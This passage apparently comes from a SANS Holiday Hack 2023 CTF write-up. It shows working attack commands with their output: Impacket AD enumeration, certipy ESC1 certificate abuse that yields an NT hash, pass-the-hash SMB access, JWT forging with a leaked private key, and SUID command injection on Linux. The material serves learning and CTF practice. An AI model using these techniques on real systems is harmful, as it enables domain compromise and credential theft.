+512: NORTHPOLE\Domain Admins (SidTypeGroup)
+513: NORTHPOLE\Domain Users (SidTypeGroup)
+514: NORTHPOLE\Domain Guests (SidTypeGroup)
+515: NORTHPOLE\Domain Computers (SidTypeGroup)
+516: NORTHPOLE\Domain Controllers (SidTypeGroup)
+517: NORTHPOLE\Cert Publishers (SidTypeAlias)
+518: NORTHPOLE\Schema Admins (SidTypeGroup)
+519: NORTHPOLE\Enterprise Admins (SidTypeGroup)
+520: NORTHPOLE\Group Policy Creator Owners (SidTypeGroup)
+521: NORTHPOLE\Read-only Domain Controllers (SidTypeGroup)
+522: NORTHPOLE\Cloneable Domain Controllers (SidTypeGroup)
+525: NORTHPOLE\Protected Users (SidTypeGroup)
+526: NORTHPOLE\Key Admins (SidTypeGroup)
+527: NORTHPOLE\Enterprise Key Admins (SidTypeGroup)
+553: NORTHPOLE\RAS and IAS Servers (SidTypeAlias)
+571: NORTHPOLE\Allowed RODC Password Replication Group (SidTypeAlias)
+572: NORTHPOLE\Denied RODC Password Replication Group (SidTypeAlias)
+1000: NORTHPOLE\npdc01$ (SidTypeUser)
+1101: NORTHPOLE\DnsAdmins (SidTypeAlias)
+1102: NORTHPOLE\DnsUpdateProxy (SidTypeGroup)
+1103: NORTHPOLE\researchers (SidTypeGroup)
+1104: NORTHPOLE\elfy (SidTypeUser)
+1105: NORTHPOLE\wombleycube (SidTypeUser)
+</code></pre><p>Bunch of more info:</p><pre tabindex=0><code>$ samrdump.py northpole.local/elfy:&#39;J4`ufC49/J4766&#39;@10.0.0.53
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Retrieving endpoint list from 10.0.0.53
+Found domain(s):
+ . NORTHPOLE
+ . Builtin
+[*] Looking up users in domain NORTHPOLE
+Found user: alabaster, uid = 500
+Found user: Guest, uid = 501
+Found user: krbtgt, uid = 502
+Found user: elfy, uid = 1104
+Found user: wombleycube, uid = 1105
+alabaster (500)/FullName:
+alabaster (500)/UserComment:
+alabaster (500)/PrimaryGroupId: 513
+alabaster (500)/BadPasswordCount: 0
+alabaster (500)/LogonCount: 12
+alabaster (500)/PasswordLastSet: 2023-12-13 01:10:31.560964
+alabaster (500)/PasswordDoesNotExpire: False
+alabaster (500)/AccountIsDisabled: False
+alabaster (500)/ScriptPath:
+[removed info for user Guest]
+[removed info for user krbtgt]
+elfy (1104)/FullName:
+elfy (1104)/UserComment:
+elfy (1104)/PrimaryGroupId: 513
+elfy (1104)/BadPasswordCount: 0
+elfy (1104)/LogonCount: 0
+elfy (1104)/PasswordLastSet: 2023-12-13 01:19:38.018905
+elfy (1104)/PasswordDoesNotExpire: True
+elfy (1104)/AccountIsDisabled: False
+elfy (1104)/ScriptPath:
+wombleycube (1105)/FullName:
+wombleycube (1105)/UserComment:
+wombleycube (1105)/PrimaryGroupId: 513
+wombleycube (1105)/BadPasswordCount: 0
+wombleycube (1105)/LogonCount: 23
+wombleycube (1105)/PasswordLastSet: 2023-12-13 01:19:38.112684
+wombleycube (1105)/PasswordDoesNotExpire: True
+wombleycube (1105)/AccountIsDisabled: False
+wombleycube (1105)/ScriptPath:
+[*] Received 5 entries.
+</code></pre><p>We can see the <code>wombleycube</code> user belongs to <code>NORTHPOLE\wombleycube</code> which is
+not <code>researchers</code>, but they were mentioned in the hint. We cannot find any users
+for the <code>researchers</code> group anyways so I guess we can concentrate on that.</p><p>Different way to get the users:</p><pre tabindex=0><code>$ GetADUsers.py northpole.local/elfy:&#39;J4`ufC49/J4766&#39; -dc-ip 10.0.0.53 -all
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Querying 10.0.0.53 for information about domain.
+Name                  PasswordLastSet             LastLogon
+--------------------  -------------------         -------------------
+alabaster             2023-12-13 01:10:31.560964  2023-12-13 03:44:12.652777
+Guest                 &lt;never&gt;                     &lt;never&gt;
+krbtgt                2023-12-13 01:17:09.824614  &lt;never&gt;
+elfy                  2023-12-13 01:19:38.018905  2023-12-13 02:23:44.438829
+wombleycube           2023-12-13 01:19:38.112684  2023-12-13 03:40:17.052271
+</code></pre><p>Cannot dump hashes with secretsdump.py because our user doesn't have access.</p><pre tabindex=0><code>$ secretsdump.py northpole.local/elfy:&#39;J4`ufC49/J4766&#39;@10.0.0.53 -dc-ip 10.0.0.53 -debug
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[error removed]
+</code></pre><p>One of the previous challenge hints talked about how AD can have the same
+certificate issues. One tool that was mentioned in the Reportinator challenge
+was <code>certipy</code> which is in included in this machine.</p><pre tabindex=0><code>certipy find -u elfy@northpole.local -p &#39;J4`ufC49/J4766&#39; -dc-ip 10.0.0.53
+
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for &#39;northpole-npdc01-CA&#39; via CSRA
+[!] Got error while trying to get CA configuration for &#39;northpole-npdc01-CA&#39; via CSRA:
+    CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for &#39;northpole-npdc01-CA&#39; via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for &#39;northpole-npdc01-CA&#39;
+[*] Saved BloodHound data to &#39;20231213035603_Certipy.zip&#39;. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to &#39;20231213035603_Certipy.txt&#39;
+[*] Saved JSON output to &#39;20231213035603_Certipy.json&#39;
+</code></pre><p>Certificate authority info</p><pre tabindex=0><code>CA Name : northpole-npdc01-CA
+DNS Name : npdc01.northpole.local
+</code></pre><p>12 certificate templates are active. These three look promising:</p><p><code>Administrator</code>, <code>User</code>, <code>NorthPoleUsers</code>.</p><p>Can we get an admin user or should we just get one for <code>wombleycube</code> because
+none of the users are admin.</p><p>Next we must request a certificate for the <code>wombleycube</code> user like this:</p><pre tabindex=0><code>$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User
+Certipy v4.0.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 773
+[*] Got certificate with UPN &#39;JOHN@corp.local&#39;
+[*] Certificate object SID is &#39;S-1-5-21-980154951-4172460254-2779440654-1103&#39;
+[*] Saved certificate and private key to &#39;john.pfx&#39;
+</code></pre><p>I got an error because I awas passing <code>npdc01.northpole.local</code> to target, I
+should have used the actual IP.</p><p>We cannot enroll as admin</p><pre tabindex=0><code>$ certipy req -username elfy@northpole.local -password &#39;J4`ufC49/J4766&#39;
+    -ca northpole-npdc01-CA -target 10.0.0.53 -template Administrator
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[!] Failed to resolve: NORTHPOLE.LOCAL
+[*] Requesting certificate via RPC
+[-] Got error while trying to request certificate: code: 0x80094012 -
+    CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template
+    do not allow the current user to enroll for this type of certificate.
+[*] Request ID is 32
+Would you like to save the private key? (y/N) y
+[*] Saved private key to 32.key
+[-] Failed to request certificate
+</code></pre><p>And we cannot do this either <a href=https://github.com/ly4k/Certipy#esc7 target=_blank rel="noreferrer noopener">https://github.com/ly4k/Certipy#esc7</a>.</p><p>Let's start with ESC1: <a href=https://github.com/ly4k/Certipy#esc1 target=_blank rel="noreferrer noopener">https://github.com/ly4k/Certipy#esc1</a></p><pre tabindex=0><code>certipy req -username elfy@northpole.local -password &#39;J4`ufC49/J4766&#39; \
+    -ca northpole-npdc01-CA -target 10.0.0.53 -template NorthPoleUsers \
+    -upn wombleycube@northpole.local -dns npdc01.northpole.local
+
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[!] Failed to resolve: NORTHPOLE.LOCAL
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 36
+[*] Got certificate with multiple identifications
+    UPN: &#39;wombleycube@northpole.local&#39;
+    DNS Host Name: &#39;npdc01.northpole.local&#39;
+[*] Certificate has no object SID
+[*] Saved certificate and private key to &#39;wombleycube_npdc01.pfx&#39;
+</code></pre><p>Then we can continue with the guide to get the hash for <code>wombleycube</code>.</p><pre tabindex=0><code>$ certipy auth -pfx w.pfx -dc-ip 10.0.0.53
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Found multiple identifications in certificate
+[*] Please select one:
+    [0] UPN: &#39;wombleycube@northpole.local&#39;
+    [1] DNS Host Name: &#39;npdc01.northpole.local&#39;
+&gt; 0
+[*] Using principal: wombleycube@northpole.local
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to &#39;wombleycube.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;wombleycube&#39;
+[*] Got hash for &#39;wombleycube@northpole.local&#39;: aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
+</code></pre><p>Option 1 returns this:
+<code>aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23</code></p><p>This didn't work with <code>smbclient</code> so I went in and used the second option this
+time:
+<code>aad3b435b51404eeaad3b435b51404ee:cf41d14e7eb9cd009b5d174b14d77d1b</code></p><p><strong>I was connecting to the file share with the wrong username when using the hashes.</strong>
+I should connect using the wombleycube username when using its hash.</p><pre tabindex=0><code>$ smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 \
+    -dc-ip 10.0.0.53 northpole.local/wombleycube@10.0.0.53
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Type help for list of commands
+# info
+[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+# shares
+ADMIN$
+C$
+D$
+FileShare
+IPC$
+NETLOGON
+SYSVOL
+# use FileShare
+# ls
+drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 .
+drw-rw-rw-          0  Wed Dec 13 01:20:30 2023 ..
+-rw-rw-rw-     701028  Wed Dec 13 01:20:33 2023 Cookies.pdf
+-rw-rw-rw-    1521650  Wed Dec 13 01:20:33 2023 Cookies_Recipe.pdf
+-rw-rw-rw-      54096  Wed Dec 13 01:20:33 2023 SignatureCookies.pdf
+drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 super_secret_research
+-rw-rw-rw-        165  Wed Dec 13 01:20:33 2023 todo.txt
+# cd super_secret_research
+# ls
+drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 .
+drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 ..
+-rw-rw-rw-        231  Wed Dec 13 01:20:33 2023 InstructionsForEnteringSatelliteGroundStation.txt
+
+# cat InstructionsForEnteringSatelliteGroundStation.txt
+Note to self:
+
+To enter the Satellite Ground Station (SGS), say the following into the speaker:
+
+And he whispered, &#39;Now I shall be out of sight;
+So through the valley and over the height.&#39;
+And he&#39;ll silently take his way.
+</code></pre><p>Answer: <code>InstructionsForEnteringSatelliteGroundStation.txt</code>.</p><h1 id=faster-lock-combination>Faster Lock Combination
+<a class=header-link href=#faster-lock-combination><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Over on Steampunk Island, Bow Ninecandle is having trouble opening a padlock.
+Do some research and see if you can help open it!</p></blockquote><p>Hs is in Brass Bouy Port.</p><blockquote><p>I'm sure there are some clever tricks and tips floating around <a href="https://www.youtube.com/watch?v=27rE5ZvWLU0" target=_blank rel="noreferrer noopener">the web</a>
+that can help us crack this code without too much of a flush... I mean fuss.</p><p>Remember, we're aiming for quick and easy solutions here - nothing too
+complex.</p><p>Once we've gathered a few possible combinations, let's team up and try them
+out.</p></blockquote><p>Google doc from the video author: <a href=https://docs.google.com/document/d/1QhKZLDr22G0RpuTSGm0M6pz4dG82IByesim3elwfw98/edit target=_blank rel="noreferrer noopener">https://docs.google.com/document/d/1QhKZLDr22G0RpuTSGm0M6pz4dG82IByesim3elwfw98/edit</a></p><p>Removed my notes here because I found <a href=https://samy.pl/master/master.html target=_blank rel="noreferrer noopener">https://samy.pl/master/master.html</a>.</p><p>I tried a few times and nothing worked. I even dumped the numbers with
+<code>console.log(lock_numbers)</code> and trying them didn't work either.</p><p>So I cheated. Put a breakpoint on <code>if (stage == 3 && !isTweenActive) {</code>. Change
+<code>stage</code> to <code>3</code> and I was done.</p><h1 id=the-captains-comms>The Captain's Comms
+<a class=header-link href=#the-captains-comms><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Speak with Chimney Scissorsticks on Steampunk Island about the interesting
+things the captain is hearing on his new Software Defined Radio. You'll need
+to assume the <code>GeeseIslandsSuperChiefCommunicationsOfficer</code> role.</p></blockquote><p>Hs is in Brass Bouy Port.</p><p>I have kept only the important parts of the dialoge.</p><blockquote><p>The new SDR uses some fancy JWT technology to control access.</p><p>The captain has a knack for shortening words, some sorta abbreviation trick.</p><p>Not familiar with JWT values? No worries; just think of it as a clue-solving game.</p><p>I've seen that the Captain likes to carry his journal with him wherever he goes.</p><p>If only I could find the planned "go-date", "go-time", and radio frequency they plan to use.</p><p>Remember, the captain's abbreviations are your guiding light through this mystery!</p><p>Once we find a JWT value, these villains won't stand a chance.</p><p>We need to recreate an administrative JWT value to successfully transmit a message.</p></blockquote><p>Good luck, matey! I've no doubts about your cleverness in cracking this conundrum!</p><p>Send a message with a new <code>go-time</code> that is four hours earlier than what was
+planned.</p><p>Four roles:</p><ul><li><code>radioUser</code>: Initial jwt. Cannot do anything.</li><li><code>radioMonitor</code>: <code>jwDefault/rMonitor.tok</code> to view data.</li><li><code>radioDecoder</code>: To decode signals.</li><li>Admin which is <code>GeeseIslandsSuperChiefCommunicationsOfficer</code>.</li></ul><p>The system uses JWT authorization bearer tokens.</p><p>The main page sets two cookies:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#586e75>// justWatchThisRole
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
+</span></span><span style=display:flex><span><span style=color:#586e75>// header
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>{
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;alg&#34;</span>: <span style=color:#2aa198>&#34;RS256&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;typ&#34;</span>: <span style=color:#2aa198>&#34;JWT&#34;</span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#586e75>// payload
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>{
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;iss&#34;</span>: <span style=color:#2aa198>&#34;HHC 2023 Captain&#39;s Comms&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;iat&#34;</span>: <span style=color:#2aa198>1699485795.3403327</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;exp&#34;</span>: <span style=color:#2aa198>1809937395.3403327</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;aud&#34;</span>: <span style=color:#2aa198>&#34;Holiday Hack 2023&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;role&#34;</span>: <span style=color:#2aa198>&#34;radioUser&#34;</span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#586e75>// signature
+</span></span></span></code></pre></div><p>And <code>CaptainsCookie</code> which appears to be malformed</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#586e75>// header
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>{<span style=color:#268bd2>&#34;captainsVictory&#34;</span>:<span style=color:#2aa198>0</span>,<span style=color:#268bd2>&#34;userid&#34;</span>:<span style=color:#2aa198>&#34;1107f7a8-1eef-4a38-b8f8-7335c94bc9c6&#34;</span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#586e75>// payload
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>e}$<span style=color:#2aa198>1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#586e75>// signature
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span><span style=color:#2aa198>00000000</span>  <span style=color:#2aa198>8</span>f <span style=color:#2aa198>95</span> <span style=color:#2aa198>89</span> dd aa <span style=color:#2aa198>16</span> <span style=color:#2aa198>86</span> <span style=color:#2aa198>67</span> c<span style=color:#2aa198>6</span> b<span style=color:#2aa198>5</span> ab <span style=color:#2aa198>7</span>b <span style=color:#2aa198>9</span>a <span style=color:#2aa198>5</span>f <span style=color:#2aa198>20</span> b<span style=color:#2aa198>2</span>  |...Ýª..gÆµ«{._ ²|
+</span></span><span style=display:flex><span>00000010  ed 80 80 0a                                      |í...|
+</span></span></code></pre></div><p>Our first task is figure out how to change the role to <code>radioMonitor</code>.</p><p><a href=https://captainscomms.com/checkRole target=_blank rel="noreferrer noopener">https://captainscomms.com/checkRole</a> uses the <code>justWatchThisRole</code> cookie as an
+"Authorization: Bearer" token.</p><p><code>X-Request-Item</code> header has the requested resource:</p><ul><li><code>waterfall</code>: decoder.</li><li><code>tx</code>: transmitter.</li></ul><p><code>https://captainscomms.com/jwtDefault</code> is also inaccesible even with the initial
+JWT.</p><p>With the default token, we get this</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#586e75>// header
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>{<span style=color:#268bd2>&#34;alg&#34;</span>:<span style=color:#2aa198>&#34;RS256&#34;</span>,<span style=color:#268bd2>&#34;typ&#34;</span>:<span style=color:#2aa198>&#34;JWT&#34;</span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#586e75>// payload
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>{
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;iss&#34;</span>: <span style=color:#2aa198>&#34;HHC 2023 Captain&#39;s Comms&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;iat&#34;</span>: <span style=color:#2aa198>1699485795.3403327</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;exp&#34;</span>: <span style=color:#2aa198>1809937395.3403327</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;aud&#34;</span>: <span style=color:#2aa198>&#34;Holiday Hack 2023&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;role&#34;</span>: <span style=color:#2aa198>&#34;radioMonitor&#34;</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>So I guess we can use this token to access the laptop monitor. The checkrole is
+called when I click on the signals so I edited the value of the
+<code>justWatchThisRole</code> in the browser.</p><p>We can click on the signals to decode them. None are accessible with our current
+token.</p><p>The value of <code>X-Request-Item</code> for them are (from left to right).</p><ul><li><code>dcdCW</code>: Has morse code and we saw it in the journal.</li><li><code>dcdNUM</code>:</li><li><code>dcdFX</code>:</li></ul><p>We need to have the <code>radioDecoder</code> role to access them.</p><p>The notes mention that captain's public key is in the same directory as the
+<code>radioMonitor</code> token. Using the authorization header we see it at
+<a href=https://captainscomms.com/jwtDefault/keys/capsPubKey.key target=_blank rel="noreferrer noopener">https://captainscomms.com/jwtDefault/keys/capsPubKey.key</a>:</p><pre tabindex=0><code>-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsJZuLJVB4EftUOQN1Auw
+VzJyr1Ma4xFo6EsEzrkprnQcdgwz2iMM76IEiH8FlgKZG1U0RU4N3suI24NJsb5w
+J327IYXAuOLBLzIN65nQhJ9wBPR7Wd4Eoo2wJP2m2HKwkW5Yadj6T2YgwZLmod3q
+n6JlhN03DOk1biNuLDyWao+MPmg2RcxDR2PRnfBartzw0HPB1yC2Sp33eDGkpIXa
+cx/lGVHFVxE1ptXP+asOAzK1wEezyDjyUxZcMMmV0VibzeXbxsXYvV3knScr2WYO
+qZ5ssa4Rah9sWnm0CKG638/lVD9kwbvcO2lMlUeTp7vwOTXEGyadpB0WsuIKuPH6
+uQIDAQAB
+-----END PUBLIC KEY-----
+</code></pre><p>Let's try doing an <code>"alg":"none"</code> attack and change our role to <code>radioDecoder</code>.
+Most likely will not work. And it didn't work.</p><p>If we see the public key, the challenge might want us to do a "sign with
+public key" attack to modify the role to <code>radioDecoder</code>.</p><p>Signing with empty key like this didn't work.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;kid&#34;</span>: <span style=color:#2aa198>&#34;../../../../../../dev/null&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;typ&#34;</span>: <span style=color:#2aa198>&#34;JWT&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;alg&#34;</span>: <span style=color:#2aa198>&#34;HS256&#34;</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Signing the key with the public key didn't work either.</p><p>The trick was trying to download <a href=https://captainscomms.com/jwtDefault/rDecoder.tok target=_blank rel="noreferrer noopener">https://captainscomms.com/jwtDefault/rDecoder.tok</a>
+with the <code>radioMonitor</code> token. Which gave me the <code>radioDecoder</code> token.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#586e75>// payload
+</span></span></span><span style=display:flex><span><span style=color:#586e75></span>{
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;iss&#34;</span>: <span style=color:#2aa198>&#34;HHC 2023 Captain&#39;s Comms&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;iat&#34;</span>: <span style=color:#2aa198>1699485795.3403327</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;exp&#34;</span>: <span style=color:#2aa198>1809937395.3403327</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;aud&#34;</span>: <span style=color:#2aa198>&#34;Holiday Hack 2023&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;role&#34;</span>: <span style=color:#2aa198>&#34;radioDecoder&#34;</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Now when clicking on the signals to decode, I get these in response:
+<code>dcdCW.mp4</code>, <code>dcdNUM.mp4</code>, <code>dcdFX.mp4</code>.</p><p>Burp was hiding the image files in the history (because that's how I usually set
+up the filters). The actual files are in paths like this
+<code>https://captainscomms.com/static/images/dcdCW.mp4</code>. It was not working in the
+Burp browser so I had to use cURL. Interestingly, the other two files didn't
+need the JWT and I could just download them.</p><p>All 3 are video files:</p><pre tabindex=0><code>// dcdCW.mp4
+SILLY CAPTAIN! WE FOUND HIS FANCY RADIO PRIVATE KEY IN A FOLDER CALLED TH3CAPSPR1V4T3F0LD3R.
+
+// dcdFX.mp4
+Image of the islands. The center one has a bubble that says &#34;Freq: 10426 Hz&#34;.
+
+// dcdNUM.mp4
+{music} {music} {music}
+88323 88323 88323
+{gong} {gong} {gong} {gong} {gong} {gong}
+12249 12249 16009 16009 12249 12249 16009 16009
+{gong} {gong} {gong} {gong} {gong} {gong}
+{music} {music} {music}
+</code></pre><p>We need to figure out the name of the private key.</p><p>Clues: <code>TH3CAPSPR1V4T3F0LD3R</code> and <code>/jwtDefault/keys/capsPubKey.key</code>.</p><p>Key is in <code>https://captainscomms.com/jwtDefault/keys/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key</code></p><p>We can forge a JWT for the admin role. The admin role is
+<code>GeeseIslandsSuperChiefCommunicationsOfficer</code>. And we can use the transmitter.</p><p>We need a <code>frequency</code>, <code>go-date</code> and <code>go-time</code>.</p><p>We already know the frequency: <code>10426</code>.</p><p>We have to decode the number station message to figure out the <code>go-date</code> and
+<code>go-time</code> of the original message and then respond with a time four hours
+earlier.</p><p>Usually the first part of the message in the number station (<code>88323</code> here) is
+the ID of the intended recipient. We can discard it here.</p><p>Looking at the rest of the numbers. They all end in 9</p><pre tabindex=0><code>12249 12249 16009 16009 12249 12249 16009 16009
+
+// if we remove it, we get 1224 1600 which are the date and time.
+
+// we need to send 4 hours earlier so
+1224 1200
+</code></pre><p><strong>And that solved the challenge.</strong></p><h1 id=linux-privesc>Linux PrivEsc
+<a class=header-link href=#linux-privesc><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Rosemold is in Ostrich Saloon on the Island of Misfit Toys. Give her a hand
+with escalation for a tip about hidden islands.</p></blockquote><p>Hint:</p><blockquote><p>There's <a href=https://payatu.com/blog/a-guide-to-linux-privilege-escalation/ target=_blank rel="noreferrer noopener">various ways</a> to escalate privileges on a Linux system.</p></blockquote><p>Another hint:</p><blockquote><p>Use the privileged binary to overwriting a file to escalate privileges could
+be a solution, but there's an easier method if you pass it a crafty argument.</p></blockquote><pre tabindex=0><code>* Find a method to escalate privileges inside this terminal and then run the binary in /root *
+
+$ whoami
+elf
+
+$ uname -a 
+Linux 69784a4cfc71 5.10.0-26-cloud-amd64 #1
+    SMP Debian 5.10.197-1 (2023-09-29) x86_64 x86_64 x86_64 GNU/Linux
+</code></pre><p>SUID executables appear to be what we should be looking for.</p><pre tabindex=0><code>$ find / -perm -u=s -type f 2&gt;/dev/null 
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/passwd
+/usr/bin/simplecopy
+</code></pre><p>The last binary is the one we should be exploiting because it's very new.</p><pre tabindex=0><code>$ ls -alt /usr/bin
+total 35800
+-rwsr-xr-x 1 root root     16952 Dec  2 22:17  simplecopy
+# removed
+
+$ /usr/bin/simplecopy --help
+Usage: ./simplecopy &lt;source&gt; &lt;destination&gt;
+</code></pre><p>We can easily copy out <code>/etc/passwd</code> and change our permissions to be able to
+run as root. However, what about the "crafty argument"?</p><p>Both arguments are vulnerable to command injection. However, first argument's
+injection will use the rest as input. So <code>/usr/bin/simplecopy nem1;ls nem2</code> will
+run <code>ls nem2</code>.</p><p>Seems like I cannot do spaces in the commands unless I split it between the
+arguments. E.g., this doesn't work because <code>ls -alt</code> is counted as one command.</p><pre tabindex=0><code>`/usr/bin/simplecopy nem2;&#39;ls -alt&#39; /root
+Usage: /usr/bin/simplecopy &lt;source&gt; &lt;destination&gt;
+bash: ls -alt: command not found`
+</code></pre><p>This should work but doesn't?!</p><pre tabindex=0><code>$ /usr/bin/simplecopy nem2;ls /root  
+Usage: /usr/bin/simplecopy &lt;source&gt; &lt;destination&gt;
+ls: cannot open directory &#39;/root&#39;: Permission denied
+</code></pre><p>For some reason I cannot see inside <code>/root</code>. Although the permissions are set.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ /usr/bin/simplecopy nem2;<span style=color:#2aa198>&#39;ls&#39;</span> -alt 
+</span></span><span style=display:flex><span>Usage: /usr/bin/simplecopy &lt;source&gt; &lt;destination&gt;
+</span></span><span style=display:flex><span><span style=color:#586e75># removed</span>
+</span></span><span style=display:flex><span>drwx------   <span style=color:#2aa198>1</span> root root <span style=color:#2aa198>4096</span> Dec  <span style=color:#2aa198>2</span> 22:17 root
+</span></span></code></pre></div><p>I am still <code>elf</code>?</p><pre tabindex=0><code>$ /usr/bin/simplecopy nem2;&#39;whoami&#39; 
+Usage: /usr/bin/simplecopy &lt;source&gt; &lt;destination&gt;
+elf
